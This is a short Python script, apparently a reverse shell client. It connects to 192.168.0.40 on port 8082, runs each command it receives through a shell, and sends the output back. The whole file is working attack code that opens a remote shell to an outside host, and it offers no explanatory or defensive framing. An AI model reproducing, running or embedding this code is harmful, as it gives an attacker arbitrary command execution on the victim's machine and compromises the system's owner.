import socket
import subprocess


remoteIP = "192.168.0.40"
remotePort = 8082

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Connecting to %s:%s" % (remoteIP, remotePort))
client.connect((remoteIP, remotePort))
print("Connected")

while True:
    print("Awaiting input")
    command = client.recv(1024)
    command = command.decode()
    pipeLine = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = pipeLine.stdout.read()
    error = pipeLine.stderr.read()
    client.send(output + error)


